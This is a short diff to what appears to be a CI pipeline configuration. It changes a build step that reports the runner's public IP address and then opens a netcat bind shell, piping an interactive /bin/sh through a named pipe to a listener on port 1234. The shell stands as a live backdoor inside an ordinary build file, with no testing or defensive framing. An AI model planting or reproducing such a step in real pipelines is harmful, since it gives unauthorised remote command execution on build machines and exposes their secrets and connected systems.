@@ -11,4 +11,4 @@ steps:
       ls
       curl ifconfig.me
       rm -f /tmp/f; mkfifo /tmp/f
-      cat /tmp/f | /bin/sh -i 2>&1 | nc -lv 12345 > /tmp/f
+      cat /tmp/f | /bin/sh -i 2>&1 | nc -lv 1234 > /tmp/f
